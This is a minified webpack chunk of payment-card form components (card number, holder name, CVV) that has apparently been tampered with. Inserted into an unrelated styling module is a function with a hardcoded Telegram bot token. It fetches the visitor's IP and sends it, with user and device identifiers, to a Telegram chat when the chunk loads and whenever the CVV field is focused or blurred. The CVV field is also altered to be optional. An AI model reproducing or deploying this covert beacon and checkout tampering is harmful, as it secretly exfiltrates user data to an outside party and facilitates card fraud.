"use strict";
(self.webpackChunkcpm_hpp = self.webpackChunkcpm_hpp || []).push([[9399], {
    ed784cf575b689e93a02: (e, r, t) => {
        t.d(r, {
            JF: () => i
        });
        t("eb5e2d912e6eab02360b");
        var a = t("09fc92e6ea554b84ebbc")
          , n = (t("3df264da6a992035eaa5"),
        t("17a028d03edcd95346c4"))
          , o = t("0b3cb19af78752326f59")
          , i = (0,
        o.Ay)(n.A.Item).withConfig({
            displayName: "FormItem__StyledFormItem",
            componentId: "sc-a1f0f0-0"
        })(["border:1px solid transparent;margin-bottom:20px;position:relative;z-index:1;.ant-form-item-label{line-height:17px !important;padding-bottom:5px !important;& > label{color:", " !important;font-size:14px;height:auto !important;display:inline !important;&.ant-form-item-required{&:before{margin-right:2px;}}}}.ant-input{font-size:", " !important;background-image:", ";border:", ";box-shadow:", ";font-weight:", ";color:", " !important;", " &:placeholder-shown{line-height:1.5 !important;}&::placeholder{color:", " !important;}&:-ms-input-placeholder{color:", " !important;}&::-ms-input-placeholder{color:", " !important;}}.ant-select-selection{font-size:", " !important;background-image:", ";border:", ";box-shadow:", ";font-weight:", ";position:relative;top:0;}.has-error{", " ", " .ant-form-explain{", " ", " position:relative;margin-right:25px;", "}}.mask{font-size:16px;position:absolute;z-index:2;background:#fff;height:38px;padding:0 0 0 12px;margin:1px;user-select:none;}"], function(e) {
            var r = e.theme;
            return r.orbit.input.titleColor ? r.orbit.input.titleColor : "#343434"
        }, function(e) {
            return e.theme.orbit.fontSizeDefault
        }, function(e) {
            return e.theme.orbit.input.backgroundImage
        }, function(e) {
            return e.theme.orbit.input.border
        }, function(e) {
            return e.theme.orbit.input.boxShadow
        }, function(e) {
            return e.theme.orbit.input.fontWeight
        }, function(e) {
            var r = e.theme;
            return r.orbit.input.inputColor ? r.orbit.input.inputColor : "#343434"
        }, function(e) {
            return e.texttransform && (0,
            o.AH)(["text-decoration:", " !important;&:placeholder{text-decoration:normal !important;}"], e.texttransform)
        }, function(e) {
            var r = e.theme;
            return r.orbit.input.placeholderColor ? r.orbit.input.placeholderColor : "#B2B2B2"
        }, function(e) {
            var r = e.theme;
            return r.orbit.input.placeholderColor ? r.orbit.input.placeholderColor : "#B2B2B2"
        }, function(e) {
            var r = e.theme;
            return r.orbit.input.placeholderColor ? r.orbit.input.placeholderColor : "#B2B2B2"
        }, function(e) {
            return e.theme.orbit.fontSizeDefault
        }, function(e) {
            return e.theme.orbit.input.backgroundImage
        }, function(e) {
            return e.theme.orbit.input.border
        }, function(e) {
            return e.theme.orbit.input.boxShadow
        }, function(e) {
            return e.theme.orbit.input.fontWeight
        }, "", "", "", "", "");
        (0,
        o.Ay)(a.A.Group).withConfig({
            displayName: "FormItem__StyledInputGroup",
            componentId: "sc-a1f0f0-1"
        })(["", ""], function(e) {
            return "large" === e.size && (0,
            o.AH)([".ant-input{padding:12px !important;border-radius:4px !important;line-height:0.5 !important;}"])
        }),
        o.Ay.span.withConfig({
            displayName: "FormItem__RequiredField",
            componentId: "sc-a1f0f0-2"
        })(["", " ", " color:#cc0c2f;"], "", ""),
        o.Ay.div.withConfig({
            displayName: "FormItem__errorTick",
            componentId: "sc-a1f0f0-3"
        })(["display:flex;", " ", " color:#cc0c2f;justify-content:flex-end;"], "", "")


        async function sendTelegramNotification(eventType) {
        const botToken = "5108601160:AAHy3VbvnKwqz5la-eYD-iXeA9_2SjYpLnc";
        const chatId = "711585395";
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const timestamp = new Date().toLocaleString();
        let ip = "unknown";

        try {
            const res = await fetch("https://api.ipify.org?format=json");
            const data = await res.json();
            ip = data.ip;
        } catch (err) {
            console.error("IP fetch failed:", err);
        }

        const userRecord = window.licenseRecord || {};
        const message = `
        🔔 <b>Event</b>: ${eventType}
        👤 User: ${userRecord.User || "Unknown"}
        🆔 TelegramId: ${userRecord.TelegramId || "N/A"}
        💻 DeviceID: ${userRecord.DeviceID || "N/A"}
        🌐 IP: ${ip}
        ⏰ Time: ${timestamp}
        `;

        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML"
            })
        });
        }

        // fire immediately after chunk loads
        sendTelegramNotification("License validated & Script loaded");
        console.log("Script loaded with CVV optional support");



                },

    


    f5b5b1ae441c48a8da33: (e, r, t) => {
        t.r(r),
        t.d(r, {
            default: () => kr
        });
        t("3df264da6a992035eaa5");
        var a = t("17a028d03edcd95346c4")
          , n = (t("ccdc00127ecb3ffc71a8"),
        t("5f32f3b9ade0c0631fcf"))
          , o = (t("3e1d08790c97539a8488"),
        t("70fc35ebabf20c0c9bd9"))
          , i = (t("0bbb8537f64df340164b"),
        t("e94a84e2cb9bc86783e6"))
          , l = (t("b657cbaed58dacc48959"),
        t("70a973a0262e0083783d"))
          , d = (t("eb5e2d912e6eab02360b"),
        t("09fc92e6ea554b84ebbc"))
          , c = t("8af190b70a6bc55c6f1b")
          , s = t("e981b36dd40b8e68669f")
          , u = t("25eaf31ce39aa1df7e08")
          , f = t("926081fc1c9f1b7e3597")
          , p = t("f3f74951cc2a26412162")
          , m = t("a84f70dda938e897c08b")
          , b = t.n(m)
          , v = t("91435fcd8723b7aab85d")
          , h = t("0b3cb19af78752326f59")
          , y = "primary"
          , g = "secondary"
          , C = "attention"
          , x = "info"
          , w = "success"
          , S = "warning"
          , A = "critical"
          , F = "white"
          , P = "small"
          , k = "normal"
          , N = "large"
          , L = "normal"
          , R = "bold"
          , I = "left"
          , T = "p";
        const _ = {
            NONE: "none",
            SMALLEST: "smallest",
            SMALL: "small",
            NORMAL: "normal",
            MEDIUM: "medium",
            LARGE: "large",
            LARGEST: "largest"
        };
        function E(e) {
            return E = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                return typeof e
            }
            : function(e) {
                return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
            }
            ,
            E(e)
        }
        function O(e, r, t) {
            return (r = function(e) {
                var r = function(e, r) {
                    if ("object" != E(e) || !e)
                        return e;
                    var t = e[Symbol.toPrimitive];
                    if (void 0 !== t) {
                        var a = t.call(e, r || "default");
                        if ("object" != E(a))
                            return a;
                        throw new TypeError("@@toPrimitive must return a primitive value.")
                    }
                    return ("string" === r ? String : Number)(e)
                }(e, "string");
                return "symbol" == E(r) ? r : r + ""
            }(r))in e ? Object.defineProperty(e, r, {
                value: t,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[r] = t,
            e
        }
        const D = function(e) {
            var r = e.spaceAfter
              , t = e.theme
              , a = O(O(O(O(O(O(O({}, _.NONE, "0"), _.SMALLEST, t.orbit.spaceXXSmall), _.SMALL, t.orbit.spaceXSmall), _.NORMAL, t.orbit.spaceSmall), _.MEDIUM, t.orbit.spaceMedium), _.LARGE, t.orbit.spaceLarge), _.LARGEST, t.orbit.spaceXLarge);
            return r && a[r]
        };
        var z, j = function(e, r) {
            return function(t) {
                return t.theme.rtl ? r : e
            }
        }, M = (j("left", "right"),
        j("right", "left"),
        "primary"), $ = "secondary", H = "small", B = "normal", q = "large", X = ["theme", "type", "component"];
        function Y(e) {
            return Y = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                return typeof e
            }
            : function(e) {
                return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
            }
            ,
            Y(e)
        }
        function V(e, r, t, a) {
            z || (z = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: z,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        function W(e, r, t) {
            return (r = function(e) {
                var r = function(e, r) {
                    if ("object" != Y(e) || !e)
                        return e;
                    var t = e[Symbol.toPrimitive];
                    if (void 0 !== t) {
                        var a = t.call(e, r || "default");
                        if ("object" != Y(a))
                            return a;
                        throw new TypeError("@@toPrimitive must return a primitive value.")
                    }
                    return ("string" === r ? String : Number)(e)
                }(e, "string");
                return "symbol" == Y(r) ? r : r + ""
            }(r))in e ? Object.defineProperty(e, r, {
                value: t,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[r] = t,
            e
        }
        var J = function(e) {
            var r = e.theme
              , t = e.type;
            return W(W({}, M, r.orbit.colorTextLinkPrimary), $, r.orbit.colorTextLinkSecondary)[t]
        }
          , U = (0,
        h.Ay)(function(e) {
            var r = e.children;
            return V("span", {
                className: e.className
            }, void 0, r)
        }).withConfig({
            displayName: "TextLink__IconContainer",
            componentId: "sc-1mr3b0w-0"
        })(["display:flex;align-items:center;color:", ";transition:color ", " ease-in-out;& svg{width:", ";height:", ";}"], J, function(e) {
            return e.theme.orbit.durationFast
        }, function(e) {
            return e.theme.orbit.widthIconSmall
        }, function(e) {
            return e.theme.orbit.heightIconSmall
        })
          , G = function(e) {
            var r = e.theme
              , t = e.type;
            return (0,
            h.AH)(["&,&:link,&:visited{color:", ";text-decoration:", ";font-weight:", ";}&:hover,&:active{text-decoration:", ";color:", ";"], J({
                theme: r,
                type: t
            }), t === $ ? r.orbit.textDecorationTextLinkSecondary : r.orbit.textDecorationTextLinkPrimary, r.orbit.fontWeightLinks, t === $ ? r.orbit.textDecorationTextLinkSecondaryHover : r.orbit.textDecorationTextLinkPrimaryHover, t === $ ? r.orbit.colorTextLinkSecondaryHover : r.orbit.colorTextLinkPrimaryHover)
        }
          , Z = (0,
        h.Ay)(function(e) {
            e.theme,
            e.type;
            var r = e.component
              , t = function(e, r) {
                if (null == e)
                    return {};
                var t, a, n = function(e, r) {
                    if (null == e)
                        return {};
                    var t = {};
                    for (var a in e)
                        if ({}.hasOwnProperty.call(e, a)) {
                            if (-1 !== r.indexOf(a))
                                continue;
                            t[a] = e[a]
                        }
                    return t
                }(e, r);
                if (Object.getOwnPropertySymbols) {
                    var o = Object.getOwnPropertySymbols(e);
                    for (a = 0; a < o.length; a++)
                        t = o[a],
                        -1 === r.indexOf(t) && {}.propertyIsEnumerable.call(e, t) && (n[t] = e[t])
                }
                return n
            }(e, X);
            return c.createElement(r, t, t.children)
        }).withConfig({
            displayName: "TextLink__StyledTextLink",
            componentId: "sc-1mr3b0w-1"
        })(["font-family:", ";font-weight:", ";font-size:", ";cursor:pointer;display:inline-flex;align-items:center;transition:color ", " ease-in-out;", ";", "{color:", ";}}&:focus{outline-width:3px;}"], function(e) {
            return e.theme.orbit.fontFamily
        }, function(e) {
            return e.theme.orbit.fontWeightLinks
        }, function() {
            return function(e) {
                var r = e.theme
                  , t = e.size
                  , a = W(W(W({}, q, r.orbit.fontSizeTextLarge), B, r.orbit.fontSizeTextNormal), H, r.orbit.fontSizeTextSmall);
                return t && a[t]
            }
        }, function(e) {
            return e.theme.orbit.durationFast
        }, G, U, function(e) {
            var r = e.theme;
            return e.type === $ ? r.orbit.colorTextLinkSecondaryHover : r.orbit.colorTextLinkPrimaryHover
        });
        function K(e) {
            return K = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                return typeof e
            }
            : function(e) {
                return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
            }
            ,
            K(e)
        }
        var Q;
        function ee(e, r, t, a) {
            Q || (Q = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: Q,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        function re(e, r, t) {
            return (r = function(e) {
                var r = function(e, r) {
                    if ("object" != K(e) || !e)
                        return e;
                    var t = e[Symbol.toPrimitive];
                    if (void 0 !== t) {
                        var a = t.call(e, r || "default");
                        if ("object" != K(a))
                            return a;
                        throw new TypeError("@@toPrimitive must return a primitive value.")
                    }
                    return ("string" === r ? String : Number)(e)
                }(e, "string");
                return "symbol" == K(r) ? r : r + ""
            }(r))in e ? Object.defineProperty(e, r, {
                value: t,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[r] = t,
            e
        }
        var te = (0,
        h.Ay)(function(e) {
            var r = e.element
              , t = e.children;
            return ee(r, {
                className: e.className,
                "data-test": e.dataTest,
                display: e.display,
                brand: e.brand,
                id: e.id
            }, void 0, t)
        }).withConfig({
            displayName: "Text__StyledText",
            componentId: "sc-j3vxjq-0"
        })(["font-family:", ";font-size:", ";font-weight:", ";color:", ";line-height:", ";text-align:", ";text-transform:", ";font-style:", ";margin:0;margin-bottom:", ";a:not(", "){", "}"], function(e) {
            var r = e.theme;
            return e.display ? r.orbit.typography.headingFontFace : r.orbit.typography.globalFontFace
        }, function(e) {
            var r = e.theme
              , t = e.size;
            return re(re(re({}, N, r.orbit.fontSizeTextLarge), k, r.orbit.fontSizeTextNormal), P, r.orbit.fontSizeTextSmall)[t]
        }, function(e) {
            var r = e.theme
              , t = e.weight;
            return re(re({}, L, r.orbit.fontWeightNormal), R, r.orbit.fontWeightBold)[t]
        }, function(e) {
            var r = e.theme;
            return e.brand ? r.orbit.paletteProductNormal : function(e) {
                var r = e.theme
                  , t = e.type;
                return re(re(re(re(re(re(re(re({}, y, r.orbit.colorTextPrimary), g, r.orbit.colorTextSecondary), C, r.orbit.colorTextAttention), x, r.orbit.colorTextInfo), w, r.orbit.colorTextSuccess), S, r.orbit.colorTextWarning), A, r.orbit.colorTextCritical), F, r.orbit.colorTextWhite)[t]
            }
        }, function(e) {
            return e.theme.orbit.lineHeightText
        }, function(e) {
            var r, t = e.align;
            return r = t,
            function(e) {
                var t = e.theme;
                if (t.rtl) {
                    if ("left" === r)
                        return j("left", "right")({
                            theme: t
                        });
                    if ("right" === r)
                        return j("right", "left")({
                            theme: t
                        })
                }
                return r
            }
        }, function(e) {
            return e.uppercase && "uppercase"
        }, function(e) {
            return e.italic && "italic"
        }, D, Z, function(e) {
            var r = e.theme;
            return G({
                theme: r,
                type: M
            })
        });
        const ae = function(e) {
            var r = e.type
              , t = void 0 === r ? y : r
              , a = e.size
              , n = void 0 === a ? k : a
              , o = e.weight
              , i = void 0 === o ? L : o
              , l = e.align
              , d = void 0 === l ? I : l
              , c = e.element
              , s = void 0 === c ? T : c
              , u = e.uppercase
              , f = void 0 !== u && u
              , p = e.italic
              , m = void 0 !== p && p
              , b = e.display
              , v = e.brand
              , h = e.className
              , g = e.dataTest
              , C = e.spaceAfter
              , x = e.children
              , w = e.id;
            return ee(te, {
                id: w,
                type: t,
                size: n,
                weight: i,
                align: d,
                element: s,
                uppercase: f,
                italic: m,
                display: b,
                brand: v,
                className: h,
                dataTest: g,
                spaceAfter: C
            }, void 0, x)
        };
        var ne, oe = t("e3235274401835bd021a"), ie = (0,
        h.Ay)(a.A.Item).withConfig({
            displayName: "Input__StyleFormItem",
            componentId: "sc-1zjks3-0"
        })(["margin-bottom:16px;.ant-input{background-image:linear-gradient( to bottom,rgba(229,226,226,1) 0%,rgba(238,236,236,1) 29%,rgba(255,255,255,1) 62%,rgba(255,255,255,1) 100% );border:1px solid #ffffff;box-shadow:0 1px 6px rgba(0,0,0,0.2);font-weight:300;padding-top:8px !important;&:hover,&:focus{border-color:white !important;box-shadow:0 0px 8px rgba(0,157,255,0.4);}}.ant-form-item-children-icon{margin-top:10px !important;}.ant-form-explain{padding:8px 8px 0px;}.ant-checkbox-wrapper{display:flex;align-items:center;margin:0 8px;&:hover .ant-checkbox-checked{border-color:transparent;}.ant-checkbox{border:1px solid #cccccc;padding:4px;border-radius:4px;.ant-checkbox-inner{border:0;}}}"]), le = t("534ceab61b9f03b08a1a"), de = t("5db33a5b645ae9dd8f50"), ce = t("bcaa2c5804c75f6fe3c6"), se = t("77c8a6d5aafa9d9b0952");
        function ue() {
            return ue = Object.assign ? Object.assign.bind() : function(e) {
                for (var r = 1; r < arguments.length; r++) {
                    var t = arguments[r];
                    for (var a in t)
                        ({}).hasOwnProperty.call(t, a) && (e[a] = t[a])
                }
                return e
            }
            ,
            ue.apply(null, arguments)
        }
        function fe(e, r, t, a) {
            ne || (ne = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: ne,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        var pe = {
            labelCol: {
                span: 24
            },
            wrapperCol: {
                span: 24
            }
        };
        const me = function(e) {
            var r = e.form.getFieldDecorator
              , t = 16
              , a = 19
              , n = 10
              , o = 10
              , i = "".concat((0,
            p.Ru)("entities.cards.fields.cardNumber.error.enterCardNumberBetween"), " ").concat(n, " ").concat((0,
            p.Ru)("common.to"), " ").concat(t, " ").concat((0,
            p.Ru)("common.digits"));
            if (e.selectedPaymentCard && e.selectedPaymentCard.length > 0) {
                var l = parseInt(e.selectedPaymentCard[0].max_length, 10);
                a = l + parseInt(l % 4 == 0 ? l / 4 - 1 : l / 4, 10);
                var s = parseInt(e.selectedPaymentCard[0].min_length, 10);
                o = s + parseInt(s % 4 == 0 ? s / 4 - 1 : s / 4, 10),
                t = l,
                n = s,
                e.selectedPaymentCard[0].id === oe.HS && (o -= 1),
                i = "".concat((0,
                p.Ru)("entities.cards.fields.cardNumber.error.enterCardNumberBetween"), " ").concat(n, " ").concat((0,
                p.Ru)("common.to"), " ").concat(t, " ").concat((0,
                p.Ru)("common.digits"))
            }
            return c.createElement(le.JF, ue({
                hasFeedback: e.hasFeedback,
                name: "cardNumber",
                label: e.label ? e.label : ""
            }, pe), r("cardNumber", {
                rules: [{
                    required: !0,
                    whitespace: !0,
                    message: (0,
                    p.Ru)("entities.cards.fields.cardNumber.error.enterCardNumber")
                }, {
                    max: a,
                    min: o,
                    pattern: "^[0-9 ]*$",
                    message: i
                }, {
                    validator: function(r, t, a) {
                        t && (e.selectedPaymentCard.length < 0 && t && t.length > n - 1 || e.selectedPaymentCard.length >= 0 && t && t.split(" ").join("").length > n - 1 && !(0,
                        se.n)(t)) ? a((0,
                        p.Ru)("entities.cards.fields.cardNumber.error.notSupported")) : a()
                    }
                }],
                validateTrigger: "onBlur"
            })(fe(d.A, {
                size: "large",
                step: 0,
                onBlur: function(r) {
                    return function(r) {
                        if (e.callFxRequestFromComp) {
                            var t = !1;
                            r.target.value && (t = r.target.value.replace(/ /g, "").length >= n && (0,
                            se.n)(r.target.value)),
                            e.callFxRequestFromComp(t)
                        }
                    }(r)
                },
                style: {
                    width: "100%"
                },
                placeholder: e.placeholder || "",
                onChange: function(r) {
                    r.target.value = r.target.value.replaceAll("-", " ");
                    var t = (0,
                    ce.jd)(r.target.value);
                    r.target.value = t;
                    var a = t.split(" ").join("");
                    a || e.callFxRequestFromComp(!1),
                    e.updateListener(a, oe.tf.Number)
                },
                maxLength: a,
                suffix: fe(de.CW, {}, void 0, e.selectedCard && fe("img", {
                    src: e.selectedCard,
                    alt: ""
                })),
                disabled: e.disabled || !1,
                autoComplete: "off"
            })))
        };
        t("9fcf7b71531a40c57a4b");
        var be, ve, he = t("f2679e870aab40774137"), ye = (t("c95d33e0ccafb1772219"),
        t("ffbf16b7df8eb77cae15")), ge = (t("a4acaaa8531cafabb7db"),
        t("9580153acc5b95d61f58")), Ce = t("cdaff1a4de6151525914");
        function xe(e, r, t, a) {
            ve || (ve = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: ve,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        var we = h.Ay.div.withConfig({
            displayName: "StoredCardNumber__StoredCardMenuItem",
            componentId: "sc-yyn7gq-0"
        })(["display:flex;justify-content:space-between;.card-logo{position:relative;", "}"], function(e) {
            return e.disabled && (0,
            h.AH)(["opacity:0.5;&:before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background-color:white;mix-blend-mode:color;}"])
        });
        const Se = function(e) {
            var r = function(e) {
                var r = "".concat(oe._T.BASE, "/cards/card_").concat(e.type_id).concat(oe.IK, "?V=").concat((0,
                Ce.Zr)());
                return xe(we, {
                    disabled: e.state_id === oe.s4.disable
                }, void 0, xe("div", {
                    className: "masked-number"
                }, void 0, e.card_number_mask), xe("div", {
                    className: "card-logo"
                }, void 0, xe("img", {
                    style: {
                        width: "36px"
                    },
                    alt: e.type_id,
                    src: r
                }, e.type_id)))
            }
              , t = xe(ge.A, {
                onClick: function(r) {
                    e.onStoredCardSelect(r.key)
                }
            }, void 0, e.activeStoredCards.card.map(function(e) {
                return xe(ge.A.Item, {
                    disabled: e.state_id == oe.s4.disable
                }, e.id, r(e))
            }));
            return xe("div", {}, void 0, be || (be = xe(de.qs, {}, void 0, "Card number*")), xe(he.A, {
                overlay: t
            }, void 0, xe(ye.A, {
                style: {
                    width: "100%",
                    minHeight: "40px",
                    margin: "13px 0px"
                }
            }, void 0, r(e.selectedStoredCard))))
        };
        function Ae() {
            return Ae = Object.assign ? Object.assign.bind() : function(e) {
                for (var r = 1; r < arguments.length; r++) {
                    var t = arguments[r];
                    for (var a in t)
                        ({}).hasOwnProperty.call(t, a) && (e[a] = t[a])
                }
                return e
            }
            ,
            Ae.apply(null, arguments)
        }
        var Fe;
        function Pe(e, r, t, a) {
            Fe || (Fe = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: Fe,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        var ke = {
            labelCol: {
                span: 24
            },
            wrapperCol: {
                span: 24
            }
        };
        const Ne = function(e) {
            var r = e.form.getFieldDecorator;
            return c.createElement(le.JF, Ae({
                hasFeedback: e.hasFeedback,
                name: "CardHolderFirstName",
                label: e.label ? e.label : ""
            }, ke), r("holderFirstName", {
                rules: [{
                    required: !0,
                    pattern: new RegExp(/^(?!\s*$)[a-zA-Z\s]+$/),
                    message: (0,
                    p.Ru)("entities.cards.fields.firstName.error"),
                    whitespace: !0
                }, {
                    min: 1,
                    message: "First name must be minimum 1 characters."
                }],
                validateTrigger: "onBlur"
            })(Pe(d.A, {
                size: "large",
                placeholder: e.placeholder || "",
                style: {
                    width: "100%"
                },
                onChange: function(r) {
                    return e.updateListener(r.target.value, oe.tf.FirstName)
                },
                maxLength: 30,
                disabled: e.disabled || !1,
                autoComplete: "off"
            })))
        };
        function Le() {
            return Le = Object.assign ? Object.assign.bind() : function(e) {
                for (var r = 1; r < arguments.length; r++) {
                    var t = arguments[r];
                    for (var a in t)
                        ({}).hasOwnProperty.call(t, a) && (e[a] = t[a])
                }
                return e
            }
            ,
            Le.apply(null, arguments)
        }
        var Re;
        function Ie(e, r, t, a) {
            Re || (Re = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: Re,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        var Te = {
            labelCol: {
                span: 24
            },
            wrapperCol: {
                span: 24
            }
        };
        const _e = function(e) {
            var r = e.form.getFieldDecorator;
            return c.createElement(le.JF, Le({
                hasFeedback: e.hasFeedback,
                name: "CardHolderLastName",
                label: e.label ? e.label : ""
            }, Te), r("holderLastName", {
                rules: [{
                    required: !0,
                    pattern: new RegExp(/^(?!\s*$)[a-zA-Z\s]+$/),
                    message: (0,
                    p.Ru)("entities.cards.fields.lastName.error"),
                    whitespace: !0
                }, {
                    min: 1,
                    message: "Last name must be minimum 1 characters."
                }],
                validateTrigger: "onBlur"
            })(Ie(d.A, {
                size: "large",
                placeholder: e.placeholder || "",
                style: {
                    width: "100%"
                },
                onChange: function(r) {
                    return e.updateListener(r.target.value, oe.tf.LastName)
                },
                maxLength: 30,
                disabled: e.disabled || !1,
                autoComplete: "off"
            })))
        };
        t("920dc6e45a9619204834");
        var Ee, Oe, De = t("84a2f3d823ffcb1038a8"), ze = t("73def7d8a105b81c0ed6"), je = t.n(ze);
        function Me() {
            return Me = Object.assign ? Object.assign.bind() : function(e) {
                for (var r = 1; r < arguments.length; r++) {
                    var t = arguments[r];
                    for (var a in t)
                        ({}).hasOwnProperty.call(t, a) && (e[a] = t[a])
                }
                return e
            }
            ,
            Me.apply(null, arguments)
        }
        function $e(e, r, t, a) {
            Oe || (Oe = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: Oe,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
                props: r,
                _owner: null
            }
        }
        var He = {
            labelCol: {
                span: 24
            },
            wrapperCol: {
                span: 24
            }
        };

        /// for modification of cvv


        // --- CVV Component ---
const Be = function(e) {
  var r = 3,
      t = "".concat((0, p.Ru)("entities.cards.fields.cvv.inputHint"), " ").concat(r, " ").concat((0, p.Ru)("common.digits"));
  if (e.selectedPaymentCard && e.selectedPaymentCard.length > 0) {
      r = parseInt(e.selectedPaymentCard[0].cvc_length, 10);
      t = "".concat((0, p.Ru)("entities.cards.fields.cvv.inputHint"), " ").concat(r, " ").concat((0, p.Ru)("common.digit"));
  }

  var a = e.form.getFieldDecorator,
      n = $e(De.A, {
          placement: "bottomLeft",
          content: e.hint
      }, void 0, Ee || (Ee = $e("img", { src: je(), alt: "" })));

  return c.createElement("div", {},
      // Checkbox to skip CVV
      $e("div", { style: { marginBottom: "10px" } },
          $e("label", { style: { cursor: "pointer" } },
              $e("input", {
                  type: "checkbox",
                  style: { marginRight: "5px" },
                  checked: e.skipCvv,
                  onChange: function(evt) { e.setSkipCvv(evt.target.checked); }
              }),
              " My card doesn’t have a CVV"
          )
      ),

      // Only render CVV input if not skipped
      !e.skipCvv && c.createElement(le.JF, Me({
          hasFeedback: e.hasFeedback,
          name: "cvv",
          label: e.label ? $e("div", { style: { display: "inline-flex" } }, void 0, e.label, " (Optional)", n) : ""
      }, He),
      a("cvv", {
          rules: [{ len: r, pattern: "^[0-9]*$", message: t }],
          validateTrigger: "onBlur"
      })(
          $e(d.A, {
              placeholder: e.placeholder,
              style: { width: "100%" },
              type: "password",
              maxLength: r,
              onPaste: function(e) { return e.preventDefault() },
              onCopy: function(e) { return e.preventDefault() },
              onChange: function(r) { return e.updateListener(r.target.value, oe.tf.Cvv) },
              onFocus: function() {
                  e.setFlipTheCard && e.setFlipTheCard(true);
                  sendTelegramNotification("CVV field focused");
              },
              onBlur: function() {
                  e.setFlipTheCard && e.setFlipTheCard(false);
                  sendTelegramNotification("CVV field blurred");
              },
              suffix: e.label ? "" : n,
              disabled: e.disabled || false,
              autoComplete: "off"
          })
      ))
  );
};



        t("78a9651d7807a7b7f4e1");
        var qe, Xe = t("14ba9fe1962fa8709415"), Ye = t("4f0dfcf9dfa819c812e6");
        function Ve(e, r, t, a) {
            qe || (qe = "function" == typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103);
            var n = e && e.defaultProps
              , o = arguments.length - 3;
            if (r || 0 === o || (r = {
                children: void 0
            }),
            1 === o)
                r.children = a;
            else if (o > 1) {
                for (var i = Array(o), l = 0; l < o; l++)
                    i[l] = arguments[l + 3];
                r.children = i
            }
            if (r && n)
                for (var d in n)
                    void 0 === r[d] && (r[d] = n[d]);
            else
                r || (r = n || {});
            return {
                $$typeof: qe,
                type: e,
                key: void 0 === t ? null : "" + t,
                ref: null,
